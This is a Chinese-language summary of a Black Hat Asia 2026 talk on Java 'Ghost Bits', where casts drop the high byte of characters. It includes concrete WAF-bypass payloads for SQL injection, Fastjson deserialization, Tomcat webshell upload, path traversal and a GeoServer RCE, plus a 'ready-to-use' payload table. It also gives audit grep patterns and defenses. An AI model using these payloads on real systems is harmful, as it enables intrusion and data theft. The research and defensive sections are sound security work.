# Ghost Bits (Cast Attack) 技术总结

> **来源：** Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Bits in Java*
> **演讲者：** Xinyu Bai (B1u3r/浅蓝) + Zhihui Chen (1ue) @ AlibabaCloud
> **整理：** 小飞鱼 | 2026-04-29

---

## 一、核心概念

### 1.1 什么是 Ghost Bits？

Java `char` 是 **16 位**（Unicode），但大量 API 在类型转换时只取 **低 8 位**，**高 8 位被静默丢弃**——这些丢失的高位称为 **Ghost Bits**。

```
Unicode 字符: 丰 (U+4E30)
              ↓  高8位: 0x4E
              ↓  低8位: 0x30 → '0'
              ↓
API: (byte) ch / ch & 0xff / write(int)
              ↓
结果: 0x30 = '0'  — 高位 0x4E 被丢弃！
```

### 1.2 触发模式

| 模式 | 示例 | 影响 |
|------|------|------|
| `(byte) ch` | 显式强转 | 高位丢弃 |
| `ch & 0xff` / `0xff & ch` | 位掩码 | 高位丢弃 |
| `OutputStream.write(int)` | 只写低8位 | 高位丢弃 |
| `DataOutputStream.writeBytes()` | 逐字节写入 | 高位丢弃 |
| `StringBufferInputStream.read()` | 旧版流读取 | 高位丢弃 |
| `RandomAccessFile.writeBytes()` | 文件写入 | 高位丢弃 |
| `URLDecoder.decode()` | 全角字符映射 | 字符篡改 |

### 1.3 攻击原理

攻击者构造特殊 Unicode 字符，使**不同解析器看到不同内容**：

```
┌─────────────────────────────────────┐
│  输入: 陪(U+966A)sp                  │
├─────────────────────────────────────┤
│  WAF 解析:  陪sp  → 非危险后缀 → PASS│
│  服务器解析: 0x6A='j' → .jsp → 上传  │
└─────────────────────────────────────┘
```

---

## 二、关键 Ghost Bit 字符映射表

| 目标字符 | ASCII | 可用 Unicode | 编码 |
|---------|-------|-------------|------|
| `.` (0x2E) | 46 | 阮 (U+962E)、铌 (U+94CC)、鄑 (U+9111) ... | `%uXXXX` |
| `/` (0x2F) | 47 | 锰 (U+942E)、陉 (U+9649) ... | `%uXXXX` |
| `0` (0x30) | 48 | 丰 (U+4E30)、谆 (U+8C06)、愤 (U+6124) ... | `\uXXXX` |
| `1` (0x31) | 49 | 丽 (U+4E3D)、痴 (U+75F4) ... | `\uXXXX` |
| `2` (0x32) | 50 | 钾 (U+7532)、扁 (U+6241) ... | `\uXXXX` |
| `e` (0x65) | 101 | 来 (U+6765)、舶 (U+8236) ... | `\uXXXX` |
| `%` (0x25) | 37 | 严 (U+4E25) ... | `\uXXXX` |
| `j` (0x6A) | 106 | 陪 (U+966A) ... | - |
| `\r` (0x0D) | 13 | 瘍 (U+764D) ... | - |
| `\n` (0x0A) | 10 | 瘊 (U+764A) ... | - |
| `@` (0x40) | 64 | 通过 `\u` escape 构造 | `\u꘠A` 等 |

---

## 三、攻击技术详解

### 3.1 WAF 绕过 — BCEL ClassLoader

**漏洞位置：** `com.sun.org.apache.bcel.internal.util.ClassLoader#createClass()` → `Utility#decode()`

**关键代码：**
```java
// ByteArrayOutputStream.write(int) 只取低8位
bos.write(ch); // ← Ghost Bits 注入点
```

**攻击效果：**
```
正常BCEL: $$BCEL$$$l$8b$I$A$...  → WAF 检测到恶意字节 → BLOCK
绕过BCEL: $$BCEL$$伟ﾋ伈伀伀伀伀乭乑乍乏... → WAF 无法识别 → PASS
                    ↓ write(ch) 丢弃高位
          实际加载: 原始恶意 BCEL 字节码 → RCE
```

---

### 3.2 WAF 绕过 — Jackson JSON 反序列化

**漏洞位置：** `com.fasterxml.jackson.core.json.UTF8StreamJsonParser` / `ReaderBasedJsonParser`

**关键函数：** `charToHex(ch)` → `sHexValues[ch & 255]`

**攻击过程：**

```
步骤1 — 构造 Ghost Payload:
  {"name": "\u丰丰耳失\u丰丰甲丰\u丰丰男堵\u丰丰茶E..."}
            ↓  Unicode 字符高位含攻击指令

步骤2 — WAF 视角:
  {"name": "\u丰丰耳失\u丰丰..."}  → 看起来是乱码 → 无 SQL 关键字 → PASS

步骤3 — charToHex(ch & 255) 解码:
  丰(U+4E30) & 255 = 0x30 → '0'
  耳(U+8033) & 255 = 0x33 → '3'
  失(U+5931) & 255 = 0x31 → '1'
  ...
  结果: "1 union select 1,2,3--"

步骤4 — Jackson 实际解析:
  {"name": "1 union select 1,2,3--"} → SQL Injection ✅
```

---

### 3.3 Fastjson `\u` 转义绕过

**漏洞位置：** `com.alibaba.fastjson.parser.JSONLexerBase#scanFieldString`

**原理：** `\u` 后跟的 Unicode 字符如果低8位构成数字，可拼接字符码点。

```
绕过payload:  {"\u꘠๐๔ type": "com.sun.rowset.JdbcRowSetImpl"}

解析过程:
  ꘠ (U+A660) → digit() → 0
  ๐ (U+0E50)  → digit() → 0
  ๔ (U+0E54)  → digit() → 4
             ↓
  拼出 Integer.parseInt("004") = 4 × 16 + 0 = 64 → '@'
             ↓
  @type → 反序列化触发 JNDI 注入 ✅
```

**支持的各语种数字字符：**
| 语种 | 数字字符 | Unicode 范围 |
|------|---------|-------------|
| 泰语 | ๐๑๒๓๔๕๖๗๘๙ | U+0E50-U+0E59 |
| 缅甸语 | ၀-၉ | U+1040-U+1049 |
| 藏语 | ༠-༩ | U+0F20-U+0F29 |
| 旁遮普语 | ੦-੯ | U+0A66-U+0A6F |
| 天城文 | ०-९ | U+0966-U+096F |

---

### 3.4 Fastjson `\x` 转义绕过

**原理：** `\x` 后允许非十六进制字符，通过字符映射表产生意外结果。

```
绕过payload:  {"\x4_type": "..."}

解析过程:
  digits['4'] × 16 + digits['_'] = 4 × 16 + 0 = 64 = '@'
             ↓
  @type → 反序列化 ✅
```

> `\x` 解析不会因无效十六进制字符报错，而是用 `digits[ch]` 映射，不存在的字符返回 `-1` 导致不可预期的复杂行为。

---

### 3.5 Tomcat 文件上传绕过（🔥 实战最强）

**漏洞位置：** `org.apache.tomcat.util.http.fileupload.ParameterParser` → `RFC2231Utility.fromHex()`

**关键代码：**
```java
// 从 Hex → byte 转换
(byte) ((Character.digit(c1, 16) << 4) + Character.digit(c2, 16))
```

**攻击：**

```
文件名: 1.陪sp

┌──────────────────────────────────────────────┐
│ RFC2231 Content-Disposition 解析:              │
│                                               │
│  陪 (U+966A):                                  │
│    高8位 0x96 → digit(0x96, 16) = -1          │
│    低8位 0x6A → digit(0x6A, 16) = 6           │
│                                               │
│  WAF/中间件:  1.陪sp → 非 .jsp 后缀 → PASS     │
│  Tomcat 保存: 1.jsp → Webshell 上传成功 ✅     │
└──────────────────────────────────────────────┘
```

---

### 3.6 全角 URL 编码路径遍历

**漏洞位置：** `java.net.URLDecoder.decode()`

**原理：** `%FF12` 先解码为全角 `２`(U+FF12)，然后 `(char)` 强制转换丢弃高位 → `'2'`(U+0032)。

```
路径遍历:

%２ｅ%２ｅ%２ｆ
     ↓ URLDecoder
全角: ２ｅ２ｅ２ｆ
     ↓ 丢弃高位
ASCII: 2e 2e 2f
     ↓
../ → 路径穿越 ✅
```

---

### 3.7 JDK Base64 解码绕过

**漏洞组件：**
- `sun.misc.BASE64Decoder` (JDK 内部)
- `com.sun.org.apache.xml.internal.security.utils.Base64` (JDK 内置)

**原理：** 解码器内部用 `ch & 0xff` 获取字符，高位 Unicode 字符被映射为标准 Base64 字符。

```
输入: ō Ř Ŗ Ŭ
  ō (U+014D) & 0xFF → 0x4D → 'M'
  Ř (U+0158) & 0xFF → 0x58 → 'X'
  Ŗ (U+0156) & 0xFF → 0x56 → 'V'
  Ŭ (U+016C) & 0xFF → 0x6C → 'l'
       ↓
"MXVi" → Base64 decode → "1ue"

效果: WAF 看到 "ōŘŖŬ" (无害)，解码后是 Base64 payload ✅
```

---

### 3.8 GeoServer CVE-2024-36401 绕过

**原始漏洞：** OGC 表达式注入 → RCE

**WAF 拦截：** 检测到 `Runtime`、`exec` 等关键字 → BLOCK

**Ghost Bit 绕过：**
```
绕过payload:
  exec(java.lang.Ru%6>time.getRu%6>time(),'touch /tmp/success')

%6>  → Jetty convertHexDigit 映射:
       6 → 6, > → 14 → e
       结果: %6e → 'n'

WAF 视角:  Ru%6>time → 不是 Runtime → PASS
Jetty 解码: Runtime → RCE ✅
```

---

### 3.9 Jetty `%u` 二次编码路径遍历

**Spring 防御：** `isInvalidPath()` 方法检查 `../`、`./` 等路径遍历字符串

**绕过：**
```
原始: /.%u002e/
         ↓
阮(U+962E) → 0x2E → '.'  
严(U+4E25) → 0x25 → '%'
灵(U+7075) → 0x75 → 'u'
丰(U+4E30) → 0x30 → '0'
甲(U+7532) → 0x32 → '2'
来(U+6765) → 0x65 → 'e'
         ↓
Spring: isInvalidPath() → 没有 ../ → PASS
Jetty:  解码 → ../../ → 路径穿越 ✅
```

---

## 四、已分配 CVE 漏洞汇总

| CVE 编号 | 影响组件 | 漏洞类型 | 严重度 |
|----------|---------|---------|--------|
| **CVE-2025-41242** | Spring Framework | 任意文件读取 | 🔴 Critical |
| **CVE-2025-7962** | Jira / Confluence (SMTP) | 邮件协议走私/钓鱼 | 🔴 Critical |
| **CVE-2026-21933** | JDK HttpServer | CRLF 注入 → XSS | 🟠 High |
| **CVE-2024-36401** | GeoServer | RCE WAF 绕过 | 🔴 Critical |

### 4.1 CVE-2025-41242 — Spring 任意文件读取

```
路径: /.阮严灵丰甲来/
      ↓  Ghost Bit 映射
      /.%u002e/
      ↓
Spring isInvalidPath(): 无 ../ → SAFE
Jetty 解码: → ../../ → 任意文件读取
```

### 4.2 CVE-2025-7962 — SMTP 协议注入

**影响范围：** Jira、Confluence 等 Atlassian 产品，及所有使用 JavaMail 的项目

**攻击链：**

```
1. 注册页面邮箱验证:
   输入: hacker[GhostBits字符]@company.com

2. 应用层校验:
   ASCIIUtility.toBytes() 中 (byte) char:
   瘍(U+764D) → (byte)0x4D → '\r'  
   瘊(U+764A) → (byte)0x4A → '\n'
   → SMTP 协议注入

3. 实际效果:
   RCPT TO: hacker@qq.com  ← 邮件发到攻击者邮箱
   DATA: 钓鱼内容
   绕过 SPF / DKIM / DMARC → 完美钓鱼 ✅
```

### 4.3 CVE-2026-21933 — JDK HttpServer XSS

```
注入:
  Cu%E7%98%8D%E7%98%8AContent-Type%3A%20text%2Fhtml...

  %E7%98%8D → 瘍 → (byte)0x0D → '\r'
  %E7%98%8A → 瘊 → (byte)0x0A → '\n'

  → Header 注入 → Content-Type: text/html → XSS ✅
```

---

## 五、供应链漏洞发现

### 5.1 自动发现工具 — Secrux

演讲者开发的**静态分析工具**，自动扫描 Java 库中的 Ghost Bits 模式。

**检测模式：**
```
• (byte) variable
• variable & 255 / 0xff & variable
• DataOutputStream.writeBytes()
• OutputStream.write(int)
• StringBufferInputStream.read()
• RandomAccessFile.writeBytes()
• URLDecoder.decode()
```

### 5.2 发现的其他供应链漏洞

| 组件 | 漏洞类型 | 位置 |
|------|---------|------|
| **ActiveJ** | HTTP CRLF 注入 | HTTP 响应头 |
| **Lettuce** (Redis 客户端) | Redis 命令注入 | `StringArgument#writeString` 中 `(byte) value.charAt(i)` |
| **XMLWriter** | XML 标签篡改 | XML 属性输出 |
| **Jodd** | 路径遍历 | 文件读取操作 |

---

## 六、渗透测试实战指南

### 6.1 立即可用的绕过技术

| 场景 | Payload 模板 | 效果 |
|------|-------------|------|
| **Tomcat 文件上传** | `1.陪sp` | Webshell 上传绕过 |
| **Jackson/SQL注入** | `\u丰丰耳失\u丰丰甲丰...` | WAF 绕过 |
| **路径遍历** | `%２ｅ%２ｅ%２ｆ` | ../ 目录穿越 |
| **Spring 文件读取** | `/.阮严灵丰甲来/` | 任意文件读取 |
| **Fastjson 反序列化** | `{"\u꘠๐๔ type": "..."}` | JNDI 注入绕过 |
| **SMTP 钓鱼** | `hacker瘍瘊@target.com` | 邮件走私 |
| **GeoServer RCE** | `exec(Ru%6>time...` | WAF 绕过 |
| **Base64 注入** | `ōŘŖŬ...` | 编码绕过 |

### 6.2 代码审计关注点

```java
// ⚠️ 以下都是 Ghost Bits 触发点，审计时重点关注:

// 1. 显式强转
(byte) character

// 2. 位掩码
ch & 0xff
0xff & ch

// 3. 输出流写 int
outputStream.write(intValue)
bos.write(charValue)

// 4. 旧版流读取
stringBufferInputStream.read()

// 5. 字节写入
dataOutputStream.writeBytes(string)
randomAccessFile.writeBytes(string)

// 6. URL 解码
URLDecoder.decode(input)
```

### 6.3 自动化扫描

```bash
# 使用 grep 搜索 Java 项目中的危险模式
grep -rn '(byte)\s*\w+' --include="*.java" .
grep -rn '&\s*0xff' --include="*.java" .
grep -rn '0xff\s*&' --include="*.java" .
grep -rn '\.writeBytes(' --include="*.java" .
grep -rn '\.write(\w+)' --include="*.java" .
grep -rn 'write(int' --include="*.java" .
```

---

## 七、防御建议

| 层面 | 措施 |
|------|------|
| **代码层** | 避免 `(byte) char` 和 `ch & 0xff` 用法，使用 `Character.charCount()` 正确处理 Unicode |
| **WAF 层** | 增加 Unicode 规范化预处理，识别 Ghost Bit 字符模式 |
| **框架层** | 升级 Spring、Tomcat、Fastjson 等到最新安全版本 |
| **检测层** | 使用 Secrux 等静态分析工具扫描项目依赖 |

---

## 八、参考资料

- **演讲视频：** Black Hat Asia 2026 官方频道（待上线）
- **演讲者 Twitter：** @iSafeBlue (B1u3r)、@luelueking (1ue)
- **工具 GitHub：** 关注 @iSafeBlue 发布
- **CVE 详情：**
  - CVE-2025-41242: Spring Framework
  - CVE-2025-7962: SMTP Injection
  - CVE-2026-21933: JDK HttpServer

---

> **最后的话：** Ghost Bits 本质是 **Java 强类型语言下的隐式类型转换漏洞**，这个攻击面在 Java 生态中被严重低估。从 Web 框架到 JDK 内部库、从 WAF 到邮件系统，几乎每个处理字符编码的组件都可能存在。
>
> —— 整理 by 小飞鱼 @ 2026-04-29
